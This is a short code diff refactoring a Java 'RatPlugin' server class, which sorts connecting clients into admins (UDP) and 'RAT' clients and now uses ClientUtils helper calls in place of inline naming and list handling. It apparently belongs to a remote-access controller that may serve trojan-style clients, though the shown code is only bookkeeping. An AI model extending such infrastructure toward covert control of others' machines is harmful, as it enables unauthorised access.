@@ -73,21 +73,13 @@ public class RatPlugin implements ServerdPlugin, ConnectListener, UpdateIDListen
     {
         if (client.protocol == Client.Protocol.UDP)
         {
-            client.setEncoder(jsonEncoder);
-
-            adminsID.add(client.id);
-
-            client.name = "Admin " + client.id;
-            client.log.setName("Admin Thread " + client.id);
-            client.programlog.setName("Admin Program " + client.id);
+            ClientUtils.makeAdmin(client,this,true);
+            ClientUtils.addToAdminList(client,this);
         }
         else
         {
-            ratsID.add(client.id);
-
-            client.name = "RAT " + client.id;
-            client.log.setName("RAT Thread " + client.id);
-            client.programlog.setName("RAT Program " + client.id);
+            ClientUtils.makeRat(client,this);
+            ClientUtils.addToRatList(client,this);
         }
     }
 
